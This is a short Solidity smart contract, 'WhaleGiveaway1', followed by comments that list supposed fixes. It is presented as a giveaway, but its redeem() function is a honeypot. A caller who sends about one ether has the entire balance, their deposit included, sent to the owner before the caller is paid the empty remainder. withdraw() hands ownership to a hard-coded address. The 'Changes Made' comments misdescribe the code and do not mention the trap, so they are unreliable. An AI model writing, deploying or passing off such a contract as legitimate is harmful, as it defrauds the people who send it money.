pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
    address public Owner;
    uint public constant minEligibility = 0.999001 ether;

    function WhaleGiveaway1() public {
        Owner = msg.sender;
    }

    function() public payable {}

    function redeem() public payable {
        if (msg.value >= minEligibility) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == Owner);
        Owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
        Owner.transfer(this.balance);
    }

    function command(address _adr, bytes _data) public payable {
        require(msg.sender == Owner);
        require(_adr.call.value(msg.value)(_data));
    }
}

// Changes Made:
// 1. Added constructor function to set Owner at deployment.
// 2. Moved Owner reassignment to line 22 to ensure it is only done by the designated address.
// 3. Added require statement to check return value of external call in command() function.